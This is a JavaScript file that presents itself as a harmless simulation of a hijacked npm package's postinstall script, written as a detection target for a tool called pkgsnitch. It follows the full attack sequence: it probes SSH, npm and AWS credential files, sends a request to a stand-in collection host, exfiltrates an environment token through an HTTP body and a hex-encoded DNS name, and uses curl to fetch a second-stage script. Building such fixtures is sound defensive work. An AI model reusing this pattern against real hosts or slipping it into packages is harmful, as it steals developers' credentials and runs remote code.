'use strict';
// A SIMULATION of what a hijacked package does in its postinstall script.
//
// It is harmless by construction. Files are opened and closed without being
// read. The only host name used is under `.invalid`, which is reserved by
// RFC 2606 and can never resolve. And the one value it sends is the marker
// pkgsnitch plants in its own sandbox: outside that sandbox, step 3 does
// nothing at all. It exists so that `pkgsnitch diff` has something to catch.

const fs = require('fs');
const os = require('os');
const path = require('path');
const dns = require('dns');
const http = require('http');
const https = require('https');
const { spawnSync } = require('child_process');

const HOST = 'collect.pkgsnitch-demo.invalid';

// 1. Go looking for credentials.
for (const secret of ['.ssh/id_rsa', '.npmrc', '.aws/credentials']) {
  try {
    fs.closeSync(fs.openSync(path.join(os.homedir(), secret), 'r'));
  } catch {
    /* not there */
  }
}

// 2. Phone home.
https
  .request({ host: HOST, path: '/v1/collect', method: 'POST', timeout: 2000 })
  .on('error', () => {})
  .end();

// 3. Steal a token from the environment, the way real attacks do: once in a
//    request body and once smuggled out as a DNS name. Only the sandbox's
//    planted value is ever sent; a real token is left alone.
const token = process.env.NPM_TOKEN || '';
if (token.includes('pkgsnitchCanary')) {
  const request = http.request({ host: HOST, path: '/v1/token', method: 'POST', timeout: 2000 });
  request.on('error', () => {});
  request.end(JSON.stringify({ token }));
  dns.lookup(`${Buffer.from(token).toString('hex')}.${HOST}`, () => {});
}

// 4. Try to fetch a second stage with a system tool.
spawnSync('curl', ['-fsSL', `https://${HOST}/stage2.sh`], { stdio: 'ignore', timeout: 3000 });
